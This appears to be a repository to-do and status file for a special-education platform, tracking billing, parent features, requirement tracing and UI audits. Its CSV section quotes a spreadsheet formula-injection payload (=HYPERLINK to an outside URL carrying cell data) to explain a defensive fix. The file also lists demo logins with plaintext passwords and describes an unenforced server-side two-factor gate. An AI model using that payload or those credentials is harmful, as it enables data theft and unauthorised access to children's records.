# What is left to do

Kept at the repository root on purpose: `docs/` is ignored in its entirety, so
a list written there is silently never committed and nobody else on the team
ever sees it.

Every item below was checked against the code on 5 September 2026, not
remembered. Where something turned out to be built already it has been struck
from the list rather than left to rot — `docs/14` still lists global search and
bulk import as gaps, and both shipped since it was written.

---

## 1. Wrong on the live site — my error, fix first

- [ ] **The Montessori copy claims a terminology layer that does not exist.**
      The homepage and the pricing page both say a Montessori setting gets "the
      words your setting actually uses", with a table showing Teacher → Guide
      and Class → Environment. Nothing in `src/` varies a single word by
      organisation kind: `montessori` is a dropdown value in
      `AddSchoolSection` and a label on the admin Schools screen, and that is
      all. `docs/11` *recommends* the label map; it was read as describing
      something built. This is on `main` and would be public the moment Render
      deploys. Either correct the words (small) or build the layer, which
      `docs/11` argues is "cheap now and impossible later".

- [x] ~~**Four sentences shipped to individuals had stopped being true.**~~
      Found by walking the funnel on 6 September. "Nothing emails either of you
      about it yet" was on the public page, the individual's home screen and
      the specialist's schedule, while `notifyAboutBooking` has sent mail both
      ways since db/104 — `specialist/Schedule.tsx` even carries a note about
      correcting this once, and the other three were missed. The account page
      told an individual no notification would ever reach them, while the same
      function pushes to `/individual/book`. The public page said sessions "do
      not exist yet" twenty lines above a paragraph on how to use them. And
      "What you actually get" listed four things, omitting suggestions, goals,
      sessions and receipts, while the pricing page's own tab described
      suggestions — two public pages disagreeing about what the product is.
      All corrected; the signup card had the same undersell and is fixed too.

---

## 2. The individual account — finishing it

- [x] ~~**There is no way to close an account, and the public page promises
      one.**~~ Built — db/096, `POST /api/account/close`, and a section on the
      account page that only an individual sees. The password is re-proved
      first, the consequences are counted from the database rather than
      described, and a paid purchase is kept and detached rather than deleted,
      because a business must be able to account for money it was paid.
      Verified end to end against the real database.
- [x] ~~**A signed-in individual cannot reach anybody.**~~ `/help` existed and
      was linked from nowhere once you signed in. It is now in the account
      menu, which every role sees — this was missing for all of them, not just
      individuals.
- [x] ~~**An individual is a paying customer with no price anywhere.**~~ The
      Pricing page now has a "For myself" tab, reading live from
      `courses.price_cents` — the same column the checkout charges from —
      rather than keeping a fourth hard-coded list. Verified: pricing a course
      at $35 made it appear on the public page, signed out, with no code
      change.
- [x] ~~**The paywall did not cover the course.**~~ db/092 put the gate on
      enrolment, which guards the progress row; module bodies stayed readable
      to anyone in the audience, one query away with the publishable key.
      db/097 moved it onto `course_modules_select` and made the first module a
      free sample, so a priced course can still be tried before it is bought.
- [x] ~~**A paying customer had no receipt.**~~ db/100 — a numbered receipt on
      its own screen, printable to PDF. Says plainly it is a receipt and not a
      tax invoice, and why: a tax invoice needs the seller's ABN and Special
      Miles has not supplied one.
- [x] ~~**Nothing held a thread from one week to the next.**~~ db/101 — goals
      in their own words with a "why" and three-option check-ins. No streak and
      no percentage, deliberately.
- [x] ~~**No way to take your own record away.**~~ Complete JSON export, built
      in the browser from ordinary reads so RLS decides what is in it, sitting
      directly above the close-account box.
- [x] ~~**Booking a session.**~~ Built across db/102-104: working hours, free
      slots derived from both diaries, asking, answering, and a directory of
      verified specialists who have hours. It is a REQUEST rather than a
      purchase — `fee_cents` is ready and null, because nobody has set a price
      for a session and a specialist's afternoon is not bought off a shelf.
- [x] ~~**Nothing emails anybody about a booking.**~~ Both directions now go
      through the server, which writes the row with the CALLER'S token so RLS
      still decides, then sends email and push — the one thing a browser cannot
      do. The specialist's email deliberately carries only the time: what
      somebody wrote about what they are finding hard stays in the account,
      where RLS governs who reads it.
- [x] ~~**The individual role is finished, end to end.**~~ Verified on 7 Sep by
      using it rather than reading it: every screen, every button actuated.
      Public funnel → signup → all six sidebar screens → receipts, the summary
      document, and four Settings tabs. AI generation confirmed working after
      db/111 replaced `my_ai_tier()` — a real ask returned a real answer on the
      paid model, with one suggestion withheld below the confidence threshold,
      zero redactions needed and no risk flag. Module completion moves the
      counts on three screens consistently (1/3 → 2/3, "2 parts finished").
      What remains below is decisions, not engineering.

- [ ] **A session has no price.** Deliberate, not missing: `plans.ts` says
      figures come from the client and the brief says willingness to pay is
      still being researched. When Special Miles sets one, the accept step
      gains a payment through the machinery db/092 already built.
- [ ] **The catalogue is the real constraint on B2C revenue** — 2 courses, 6
      modules and 1 article for individuals. The till works; there is very
      little to sell. Not an engineering task.
- [x] ~~**The AI is the one thing with a real marginal cost and it is free and
      uncapped.**~~ db/099 — cheap model by default, escalating to the capable
      one whenever the answer is risk-flagged or would show nothing. Two
      calibration notes for real usage, both configurable columns: the free
      threshold (0.80) is a first guess, and on a single sample the PAID tier
      showed fewer suggestions than the free one, because Opus scores itself
      honestly near its 0.70 bar while the cheap model inflates. Worth watching
      the escalation rate and the withheld counts before tuning either.

- [x] ~~**The paid AI tier was unreachable, so db/099 was a capability with no
      consumer.**~~ db/099 defined paid as "has bought a course" and said the
      day a subscription existed the function would gain a branch. Every course
      is priced null and course-checkout refuses a free course, so no new paid
      purchase row could be created by anybody — `my_ai_tier()` returned 'free'
      for every individual alive, and `paid_model`, `daily_limit_per_user` and
      the escalation path were live code nothing could reach. db/111 adds the
      subscription and the branch.
- [ ] **Set a subscription price, or decide there is not one.** db/111 ships
      the machinery with `price_cents` null and `is_offered` false, because
      willingness to pay is still being researched with Practera and this
      project does not print figures nobody has agreed to. Nothing is on sale
      until Special Miles creates a recurring Price in Stripe and runs the one
      UPDATE at the bottom of db/111. A check constraint refuses to put a plan
      on sale without both a price and a Stripe price id, so it cannot go live
      half-configured. Set from **Platform Admin → Subscriptions → "What an individual pays"**;
      no SQL and no deployment. **Joe's call, not an engineering task.**
- [ ] **Decide whether there is a free trial, and how long.** `trial_days` is
      null, which means no trial, and every public page says so plainly rather
      than implying one. Setting it to a number passes it to Stripe as
      `trial_period_days`; Stripe owns the clock. Note this is NOT the school
      trial — `TrialNotice.tsx` says outright that MiZanova has no trial end
      date and no billing clock, which stays true for schools, who are invoiced
      after a conversation. **Joe's call.**
- [ ] **The Stripe key is a placeholder, so no payment can complete.** Corrected
      on 6 September: an earlier note here said the key was *empty*, which was
      wrong — `.env.local` holds `sk_test_…xxxx` and `whsec_…`, both the right
      shape and neither real. The first genuine call returns "Invalid API Key
      provided". Render has separately never deployed. Needs a real Stripe test
      key to exercise a payment end to end. **Saurab's.**
- [x] ~~**/api/health was green on a key that could not take a payment.**~~
      `stripe_key_looks_right` was `startsWith('sk_')`, so a shaped placeholder
      passed and the endpoint reported `"status":"ok"` with every Stripe check
      true. Its own docstring says a health check that is green during an
      outage is worse than none. It now asks Stripe (cheapest authenticated
      read, cached five minutes, failures cached too) and reports "degraded".
      Anthropic is deliberately still presence-only: the cheapest honest check
      there is a generation, which would charge Special Miles per poll.

---

## 2b. The parent role — audited by using it, 8 September 2026

Signed in as a parent and walked all thirteen sidebar screens against a child
with real data. Four defects, all fixed; every one of them was green under
lint, the typecheck and the build both before and after, and none was visible
from reading the code.

- [x] ~~**A co-parent's writing was rendered as your own.**~~ `logged_by` has
      been written since db/007 and was never selected back, so a child's
      second guardian met "your home observations: 1" having written nothing,
      the other parent's account of an evening with no name on it, and a
      "Correct this" whose update db/007's policy was always going to refuse.
      The refusal itself was sound — `assertChanged` caught it — but it read
      "your account does not have permission for this record", which blames
      the account rather than saying somebody else wrote it. Verified both
      ways: the co-parent's note is attributed and has no edit control, and a
      note written by the signed-in parent still has one and still saves.
- [x] ~~**The month calendar's header read "Mon, 5 Jan" over September.**~~
      `dayHeaderFormat` was written for the week header, where every column is
      a real date, and applied to every view. A month grid's header names seven
      weekdays for five weeks at once, so FullCalendar dated them from an
      arbitrary reference week — and the Sunday column read 4 Jan, after
      Saturday's 10th. It was on the parent, specialist and educator calendars
      alike. Week and day views still show real dates; checked after the fix.
- [x] ~~**An IEP card asked for agreement it already had.**~~ Opening the panel
      was the only way to see whether your own confirmation had registered, so
      the card sat at "Read it and agree" under a pill reading "Agreed at the
      meeting" — the unreadable pairing `FamilyIepPlans.tsx` was written to fix,
      still standing on the one control a family presses. The card now carries
      "You have agreed" and the button reads "Read it again".
- [x] ~~**Every date field defaulted to yesterday until mid-morning.**~~
      `new Date().toISOString().slice(0, 10)` is UTC and Australia is UTC+10, so
      for the first ten hours of each day a parent writing up last night dated
      it a day early — and the field's own `max` refused to let them correct it
      to today. Found live: an observation logged at 01:17 on 8 September was
      filed as the 7th. `src/lib/localTime.ts` already existed to stop exactly
      this and its docstring names the fault; it now exports `todayLocal()`.

- [ ] **The same UTC expression is still on eleven other call sites**, none of
      them reachable from a parent account and so none verified by this pass.
      Each defaults or caps a date and each is a day early every morning:
      `components/IepDocumentsSection.tsx:77`, `components/SessionsSection.tsx:175`,
      `lib/api.ts:4510`, `lib/api.ts:4541` (writes `ends_on`),
      `lib/api.ts:8008`, `lib/api.ts:8774-8775` (a reporting range),
      `pages/educator/AddStudent.tsx:159` (caps a date of birth),
      `pages/platformAdmin/Subscriptions.tsx:339`,
      `pages/shared/IepPlanEditor.tsx:368`, `pages/shared/IepPlans.tsx:146`
      (writes `plan_date`). The fix is `todayLocal()` in each; what it needs is
      somebody signed into those roles to confirm nothing else read the old
      value. The download-filename and authenticator-label uses of the same
      expression are left alone deliberately — a filename a day behind is not
      a record a day behind.

- [ ] **Nothing tells a parent a plan is waiting for their agreement.** The
      notification bell gives a parent unread conversations and unpaid invoices;
      an IEP awaiting confirmation passes the bell's own test — it links to the
      screen that clears it — and is the thing a school most needs a family to
      act on. Not built rather than broken, so it is listed rather than fixed.

- [ ] **A plan's review date passes in silence.** The card read "to be reviewed
      around 29 Aug 2026" on 8 September in the same grey as everything else.
      Whether that should be the family's problem to notice is Joe's call.

### The UI pass over the same thirteen screens

Measured rather than eyeballed — every figure below came out of the running
page, at 1159px and again at 375px.

- [x] ~~**The calendar was taller than the window.**~~ 1099px of calendar in a
      698px viewport, so the page scrolled instead of the grid and the toolbar
      and day headers scrolled away with it. `height="auto"` makes FullCalendar
      as tall as its content, and the visible day is widened to fit whatever is
      booked — one 7:30pm session anywhere in the loaded set opened every week
      at 7am–9pm, 28 half-hour rows. A real height (`70vh`) gives the grid its
      own scroller: 489px, header pinned, and `scrollTime` opens it at the
      school morning. Month view now fits a whole month on one screen.
- [x] ~~**No line showed the time of day.**~~ The red now-indicator only draws
      inside the visible hours, and with the grid opening wherever the widening
      reached, it was never where anybody was looking. Confirmed the machinery
      itself is sound by temporarily widening the day to midnight: the line
      rendered at the right offset in the right colour, then the probe was
      reverted. It stays absent outside 7am–9pm, which is correct for a school
      calendar — a line at 2am marks nothing.
- [x] ~~**The calendar toolbar crammed three groups onto one row on a
      phone.**~~ At 394px the title got a 90px column, so "1 – 30 September
      2026" wrapped onto three lines between two button groups and the view
      switcher sat flush against the right edge. The scoped calendar CSS had no
      responsive rule at all — it is 90 lines of colour and nothing about small
      screens. Stacked below 640px, title first.
- [x] ~~**Nine standalone controls were under the 44px touch floor.**~~ Every
      one was a bare text button: "View goals →" and "All appointments →" at
      20px, "Read it and agree" at 20px — the single control a family presses
      on the IEP screen — "Correct this", "Read it" ×3 in the Library at 20px,
      "Start this course" at 36px and "Log an observation" at 40px. The idiom
      already existed: `inline-flex min-h-11 items-center`, from the sign-in
      touch-target fix, which also warns against widening a target so far that
      it becomes a different bug. All thirteen parent screens now measure zero.

**Clean, and worth not re-checking:** no screen scrolls horizontally at 375px,
on any of the thirteen. The contrast checker passes WCAG AA on every pair in
use, including the calendar's event colours.

- [ ] **The same sub-44px text button is on nineteen more call sites**, in
      fourteen files across specialist, educator, platform admin and individual
      screens. Not touched, for the reason the date fix was not: they belong to
      roles this pass could not sign into. The fix is the same class string
      each time.
- [ ] **The visible hours are computed from every appointment loaded, not the
      week on screen.** A single evening booking in August still widens
      September's empty weeks to fourteen hours. Harmless now the grid scrolls
      inside itself, and worth fixing when somebody is next in that file.
- [ ] **The sidebar says "Collab & Finance" and the page says "Finance".**
      One of the two is wrong and it is not obvious which.

### Checked and sound, so nobody re-audits them

About your child, Privacy & Consent, Link a child, Resources, Academy, Library,
Messages and Collab & Finance all say what they do and do what they say.
"About your child" names the other guardian outright, which is what made the
observations screen's silence about authorship a contradiction rather than
just a gap. The Resources page still promises no email about resources, and
that is still true — nothing notifies on a shared resource.

### The demo account

`parent.demo@mizanova.test` / `Demo!Parent2026` — a second guardian on Ethan
Mitchell at the demo school, made because the three real parent accounts belong
to teammates. Delete the account and its `student_guardians` row when it has
served its purpose. It holds one IEP agreement on the plan of 22 Aug, left in
place because the screen says agreement cannot be undone there and quietly
deleting it from behind would make that untrue.

---

## 2c. What the client documents ask of a parent — 8 September 2026

Read out of `docs/1.WDPBI Special Miles_Joe Abboud 14022026.docx` and
`docs/Final Requirements.docx`, then checked one by one against the code and
the live database rather than against memory.

### Built, and verified by using it

- [x] ~~**A family could not read the advice attached to an incident they were
      told about.**~~ db/113. Measured before: 121 strategies existed, 136 logs
      had been shared with parents, and 86 of those carried advice no guardian
      could read. `ai_strategies` had two select policies and neither mentioned
      a guardian. Two gates on the new one: the log must have been shared, and
      the status must be settled. Verified signed in — five strategies across
      three of Arlo Kaur's six shared updates.

      **A defect this introduced, caught by looking at it.** The heading read
      "What can help at home" over advice that said "put the next activity on
      the whiteboard" and "whole-class practice, so no individual singling
      out" — `generateStrategies` writes to a teacher about a room full of
      children. It now says "What the school is trying", says it is classroom
      advice, and points at the screen that answers the home question.

- [x] ~~**FR9 / P06 — a parent got no suggestions at all.**~~ db/114. Two
      tables, a third system prompt written for a kitchen rather than a
      classroom, and `/api/home-strategies`. Proved end to end on a real
      observation about bath time: two suggestions published at 0.85 and 0.82,
      one held at 0.78 with its reason recorded, running on the free tier's
      cheap model, `school_id` null on the spend record so the school's daily
      budget is untouched, and the cap reading 1 of 40.

      Nothing is discarded here, unlike db/094 — a child has a specialist, so
      what falls under the bar waits for them. That is FR9's own requirement
      and the reason this could not reuse the individual's tables.

### Still missing, in the order I would build them

- [x] ~~**FR6 / P05 — a parent cannot book a specialist session.**~~ db/115.
      One more status on `specialist_appointments` rather than a second table,
      because a parent's request is for a child and the row it wants to become
      is exactly the row a specialist would have created. Accepting is an
      UPDATE. A family may ask their child's assigned, verified specialist and
      may withdraw a request nobody has answered; they cannot confirm their
      own, book an unverified clinician or a class teacher, or ask on behalf
      of another family's child.

      **The part that would have shipped broken:** `free_slots` excluded
      appointments with `status <> 'cancelled'` — a negative list from when
      'cancelled' was the only status that did not occupy a diary. Adding
      'requested' to it would have let one unanswered request remove a slot
      from the calendar it was asked from, so a family could empty a
      specialist's availability for everybody by asking for everything. It is
      a positive list now, and the test asserts 8 free slots → 8 while
      requested → 7 once agreed.

      **The payment half is deliberately absent.** FR6 says "book and pay";
      `fee_cents` has been on the table since db/073 and is null on every row
      because nobody has priced a specialist's afternoon.
      `raise_appointment_invoice()` is ready for the day there is a figure.
- [x] ~~**P03 — no export.**~~ "Export as a spreadsheet" on Home Observations.
      CSV rather than PDF because these are rows — a date, a category and two
      pieces of text — which is a spreadsheet's shape and not a document's; the
      Progress report is the one that prints. It exports the whole history
      rather than the filtered view, and names the author, because both
      guardians write here and a file with no names loses which of them said
      what the moment it leaves the product.

      **It also closed a hole that was already open in three other exports.**
      `AuditLog`, `RecordAccess` and `Courses` each had a local escaper that
      quoted correctly and did nothing about formula injection: a cell
      beginning `=`, `+`, `-`, `@` or a tab is evaluated by Excel, Numbers and
      Sheets on open. Free text in this product is written by parents and
      teachers, so `=HYPERLINK("http://…"&A1,"click")` in an observation would
      put a child's data one click from leaving, inside a file the school
      believes it produced itself. `src/lib/csv.ts` prefixes an apostrophe —
      what spreadsheets write themselves — rather than stripping the character,
      because "-2 hours of sleep" is a thing people write. Eleven unit tests,
      and proved end to end by typing a real HYPERLINK formula into a real
      observation and reading it back out of the download defused.
- [ ] **FR24, the half that is clearly a parent's** — "request specialist
      progress reviews". Creating SMART goals is the other half and I would
      argue against it: a goal a parent adds to a school's IEP that no teacher
      agreed to undermines the plan model. **Worth Joe deciding.**
- [ ] **P01 — nothing notifies a family when a teacher shares something.** The
      bell gives a parent unread conversations and unpaid invoices only.
- [ ] **P02 — 15 course modules, 0 with a video, 3 articles.** The code links
      out rather than embedding, which is small. The absence of any video is a
      content problem.

### Not engineering, or not yet

- [ ] **FR7 / 1.5.2 Parent Premium.** No parent subscription exists; db/111
      built that shape for individuals only. Blocked on the same two things:
      no real Stripe key, and no agreed price. The Pricing page advertises
      $9.99 and $19.99 with "Tell me when this opens", which is honest.
- [ ] **FR23 neurodevelopment profile.** Nothing exists. It would make
      diagnosis the most sensitive field in a product that says "never
      diagnostic" on six public pages. **Needs Joe on consent, visibility and
      retention before any schema.**
- [ ] **1.4.2 automated daily sync reports.** `server/index.js` says outright
      there is no scheduler and that its first act must not be mailing people.
- [ ] **P03 delete.** db/007 has no delete policy on purpose and the screen
      says "Observations are corrected rather than deleted". FR8 asks for
      delete. **A deliberate divergence worth confirming rather than quietly
      complying with** — a note the school has acted on should not vanish.

---

## 2d. Every requirement in the client documents, traced — 8 September 2026

Read out of `docs/1.WDPBI Special Miles_Joe Abboud 14022026.docx` and
`docs/Final Requirements.docx` and checked against the code, not remembered.
FR1–FR26 and NFR1–NFR7 in full, so nothing has to be rediscovered.

### The three relations the documents themselves define

`Final Requirements` §2 names them under "System Logic", and they are the
spine of the product rather than diagram decoration:

| Relation | Document | State |
|---|---|---|
| **«include»** behavioural logging → anonymisation | "Student PII is automatically stripped before any data is saved or processed" | **Built and fails closed.** `buildAnonymousPayload` redacts every child at the school, and `findLeaks` re-checks the assembled payload and refuses the call rather than send. `anonymised_input` stores exactly what left, so the claim is a query rather than a promise. |
| **«extend»** AI strategy request → specialist review queue | "high-risk or low-confidence AI suggestions are manually validated by a human expert before being released" | **Built twice.** db/006 for a teacher's log; db/114 for a parent's home observation. It is the reason db/114 could not reuse `individual_ai_requests`, whose header says it has no review state because an individual has no specialist. |
| **Commercial** Stripe Payment + Premium Reports | "bridge the gap between classroom functionality and business sustainability" | **Half.** Stripe checkout exists for courses. Premium Reports (FR7) do not, and the key is a placeholder. |

### Built

FR1 behaviour logging · FR2 timer (`useTimer`) · FR3 voice (`useSpeechToText`)
· FR4 three AI strategies with names stripped · FR6 booking, the request half
(db/115) · FR8 home observations · FR9 parent AI strategies (db/114) · FR10
low-confidence queue (`specialist/ReviewQueue`) · FR11 private specialist notes
(`specialist_session_notes`) · FR13 assignments and permissions
(`schoolAdmin/People`) · FR14 safeguarding lock (db/010) · FR16 institutional
KPI dashboard (db/014) · FR18 WWCC verification pipeline (db/013, db/048) ·
FR19 revenue dashboards · FR20 AI thresholds and FR21 kill switch
(`ai_controls`) · FR25 consent with revoke and audit (db/021) · FR26 in-app
messaging (db/009, db/084) · NFR2 offline (`sw.ts`, `offlineQueue`) · NFR3
mobile-first (audited 8 Sep) · NFR6 data in Sydney.

### Contradicts the spec, deliberately — Joe should confirm rather than discover

- [ ] **FR5 says "the student's First Name only". Parent screens show the full
      name.** Reversed on Saurab's call on 4 September and recorded in
      `parent/Dashboard.tsx`, which also names the cost: a screenshot shared in
      a group chat now carries a surname. Thirteen call sites use
      `fullName(child)`. The reasoning is sound — RLS never sends a parent
      another family's row, so the short form was a display choice not a
      protection — but it is a written requirement being knowingly overridden.
- [ ] **FR8 says a "private" area for home observations; db/007 shares them
      with assigned staff the moment they are written.** Deliberate and
      documented, and the screen says so. Same shape: worth confirming.
- [ ] **P03 says parents may DELETE their own notes; db/007 has no delete
      policy**, on purpose — "observations are corrected rather than deleted".

### Not built, in the order I would take them

- [ ] **FR15 — Auto-share and Parent Invite toggles.** Nothing under any
      spelling. Sharing is a per-log decision by a teacher today; there is no
      school-level policy switch at all. Small, and it is an admin screen plus
      one column.
- [ ] **FR17 — a Country on each school to trigger local privacy law.** No
      country column exists. Everything is implicitly Australian. Matters the
      day a second jurisdiction appears, and is much cheaper before then.
- [ ] **FR12 — a version-controlled library of proven strategies.** Specialists
      review suggestions one at a time and nothing accumulates. Distinct from
      the Library (articles) and the Academy (courses).
- [ ] **FR7 / 1.5.2 — Parent Premium and the 3-month report.** Eleven named
      sections. Blocked on price and a real Stripe key.
- [ ] **FR23 — optional neurodevelopment profile.** Needs Joe on consent and
      visibility before schema.
- [ ] **FR24 — the parent half of SMART goals.** "Request specialist progress
      review" is clearly a parent action and is missing; creating goals I would
      argue against.
- [ ] **FR22 — Development / Staging / Production switch.** One environment.
- [x] ~~**NFR5 — sessions must time out after 20 minutes.**~~ `IdleTimeout`,
      mounted in `AppShell`. It follows `MFA_REQUIRED_ROLES` rather than
      applying to everybody: `Final Requirements` puts NFR5 under the
      specialist's section and pairs it with the 2FA this product already
      enforces for exactly those four roles, and they are the four with
      somebody else's child on screen. A parent on their own phone gains
      nothing from being signed out every twenty minutes.

      It warns a minute first, because a teacher is most likely to be idle
      here while part-way through a behaviour log that exists nowhere but the
      form. A banner rather than a modal — the decision it offers is "carry on",
      and a modal could not have been verified in the in-app browser anyway.

      Proved by shortening the clock and widening the roles temporarily: the
      warning appeared, ignoring it signed the session out to `/login`,
      pressing "Stop the clock" cleared it and the session outlived its
      original deadline. Probe reverted. The Security tab's own "not built yet"
      note stopped listing the auto-lock and now describes it, gated on the
      same constant so the two cannot drift.
- [ ] **NFR4 — "WhatsApp notifications must not contain names; only a secure
      link."** There is no WhatsApp integration at all, so the requirement is
      vacuously satisfied and actually unbuilt. Email and push exist and both
      already withhold names, which is the same protection by another route.
- [ ] **NFR1 — strategies in under 3 seconds.** Never measured, and db/099's
      escalation deliberately makes the slow path slower to make the answer
      better. Worth measuring before claiming either way.
- [ ] **NFR7 — architecture defined for webapp AND mobile app.** There is one
      codebase, a PWA. No mobile-app scope is written down.

---

### One child switcher, not eight — 8 September 2026

Saurab's call, and the right one. `ChildSwitcher` was drawn on all eight parent
screens, which is the same settled decision asked eight times. The choice
already lived in `localStorage` and every screen read it on mount, so nothing
about the mechanism had to change: switching on Home has always changed what
the whole role is looking at. Drawing it repeatedly only made a decision look
unsettled and took a row off every page.

It now renders on Home alone. What every other screen has to do instead is name
the child in its own lead sentence, so a family with two never wonders whose
page they are on — seven of the eight already did, and **Appointments did not**,
which is why removing its switcher without adding the name would have made it
worse rather than tidier.

Verified by switching to Ethan on Home and walking Goals, Appointments and
Progress: all three followed, none drew a switcher.

---

### The UI sweep, done properly — 8 September 2026

Saurab pointed out that I had been checking pages rather than reading them:
looking for what I expected, on one screen's worth of a page that is five
screens long. Two mechanical reasons it kept working out that way, both worth
knowing before the next role is audited:

- **`get_page_text` returns `<main>` only.** The shell, the account menu, the
  notification bell, toasts and dialogs are all outside it. Every "full page"
  read this session before now was missing them.
- **`innerText` omits a closed `<details>`.** `NotBuiltYet` renders one on
  almost every screen, so the honest "what this does not do yet" note reads as
  an empty heading. I reported it as a bug for a minute before checking.

The method that works: expand every `<details>`, click every
`[aria-expanded=false]`, then read `document.body.innerText` — and press the
controls rather than reading their labels.

Three faults it found, all copy rather than logic, and none of which any test
would have caught:

- [x] ~~**A parent was told their photo is "how you appear to colleagues and
      families".**~~ `Profile.tsx` decided staff-vs-not with
      `role !== 'individual'`, which made parents and students staff. Every
      parent account carries `school_id` null, so they were not in a school in
      any sense the rest of the product uses. Three groups now.
- [x] ~~**"Recent highlights" listed a nightly fight.**~~ The section draws
      ticked milestones and every home observation, and the closing line
      promised "things that went well". The first real one under it read "Bath
      time falls apart every night". There is no sentiment to filter on and
      inventing one would be the product deciding which of a family's evenings
      counted as progress, so the heading says what is in the list: "Lately".
- [x] ~~**The sidebar said "Collab & Finance" and the page said "Finance".**~~
      The screen has never had a collaboration half.

Checked and working, by pressing them rather than reading them: Academy
enrolment and module completion (0 → 1 of 3, the tick, the auto-advance), the
message composer with attachments, dictation in five languages and voice notes,
the notification bell, all four account-menu destinations, and Link a child.

- [ ] **Message threads say "about Arlo K." while every other parent screen
      says "Arlo Kaur".** The Library still carries an article to families
      explaining the short form. Saurab reversed to full names on 4 September;
      this is the one place that did not follow, and the article now describes
      behaviour the product mostly does not have. **His call, like FR5.**

---

## 3. Real product gaps

- [x] ~~**Availability does not exist.**~~ db/102. Recurring weekly hours, an
      exclusion constraint against overlaps, readable by anyone signed in and
      writable only by the specialist or a platform admin. The booking half is
      in §2.
- [ ] **The Compliance screen is missing most of its design** — overdue
      documents, upcoming deadlines, missing signatures, service minutes,
      therapy delivery percentages, and the buttons to draft reports and send
      reminders.
- [ ] **Empty states.** `docs/14` calls this the single best thing in the whole
      Customer.io study. Every empty state here is a title and a sentence in a
      box, and it is what a brand-new school sees most.
- [ ] **The student record is one long scroll** — the busiest screen in the
      product, and it has no tabs.
- [ ] **No setup checklist for a new school.** A new school arrives with no
      staff, no students and no order of operations.

### Already built — checked, not assumed

Global search, the notification bell, bulk student import and sidebar grouping
all exist now, so `docs/14`'s backlog is considerably shorter than it reads.

**The signed-in app already has a mobile menu too.** This list said it did not,
which was wrong: `AppShell` has a `md:hidden` button and an overlay drawer, and
the claim was written from memory rather than from the code. It is the exact
failure this file opens by warning about — an absence stated with confidence
and never checked.

---

- [x] ~~**The individual's notification bell was an empty box.**~~ db/105. The
      bell's own file warned against showing "four roles a number and the fifth
      an empty box", and the individual was the sixth. Now carries one line —
      a session request answered — which clears when they open the screen it
      points at, the test the bell requires of anything in it.

- [x] ~~**Nothing followed up.**~~ db/106. A goal nobody has asked about in a
      week is surfaced on the home screen, on the goal itself and in the bell —
      pulled when somebody opens the product, never pushed by a clock, because
      server/index.js already decided there is no scheduler here and its first
      act must not be mailing people. "Not now" snoozes rather than dismisses.
- [x] ~~**The AI never sees what happened before.**~~ db/107. Opt-in, off by
      default, because Goals.tsx promised nobody else can see any of it and an
      AI is somebody else. Three goals, their check-ins and the last three
      questions, all through the same redaction. Measured on the same question:
      without it, generic advice it had already given; with it, "You've
      mentioned before that nights run away with you until around two" —
      connecting two conversations a fortnight apart.

- [x] ~~**A suggestion was a dead end.**~~ db/108 records whether one helped and
      feeds that back to the model; db/110 lets somebody ask about a particular
      suggestion without starting over. db/109 closed a hole db/108 opened.

### The demo account

`individual.demo@mizanova.test` / `Demo!Individual2026` — an individual with one
settled $49 purchase behind receipt 1002 and one goal with a check-in, so every
screen has something real on it. Delete it from the account page when it has
served its purpose; closing it removes everything and detaches the purchase.

---

## 4. Housekeeping

- [x] ~~Delete the test account `zz-individual-test@example.invalid`.~~ Gone —
      it was closed through the new closure flow, which tested the feature and
      cleared the account in one go.
- [ ] The Library carries a file titled **"articultion exrecise"** — two
      spelling mistakes, visible to every user who opens the Library.

---

## 5. Parked on purpose, with reasons

- [ ] **`db/proposed/083` — the two-factor gate.** `src/lib/roles.ts` says four
      roles must have two-factor authentication because "a stolen password
      should not be enough on its own". That is enforced in the browser only:
      **0 of 127 policies look at the authentication assurance level**. The
      publishable key ships in the bundle, so a stolen staff password reads
      children's records without meeting a code prompt. Parked because
      applying it needs `tests/helpers/world.ts` taught to enrol TOTP first —
      real work, and a security change whose first effect is a red suite gets
      reverted rather than understood.
- [ ] **Service worker "new version ready" activation.** Offline loading works
      and is verified; the update handshake is unresolved and set aside.
- [ ] **CI runs against the production database.**

---

## 6. Needs Saurab, not code

- [ ] **Render has never deployed the current `main`.** The live site is
      missing 26 modules including the whole Academy, Courses and Library — not
      just recent work. Check the build log for `vite: not found`; the build
      command must be `npm install --include=dev && npm run build`, because
      `vite` is a devDependency and the service sets `NODE_ENV=production`.
- [ ] **`STRIPE_SECRET_KEY` on the live server.** `/api/health` reports it
      absent, so course payments cannot work there.
- [ ] **Confirm the support contacts.** The AI risk panel shows Lifeline
      13 11 14 and 000. Both are long-standing, but they are a statement made
      to somebody in distress and Special Miles should sign them off.
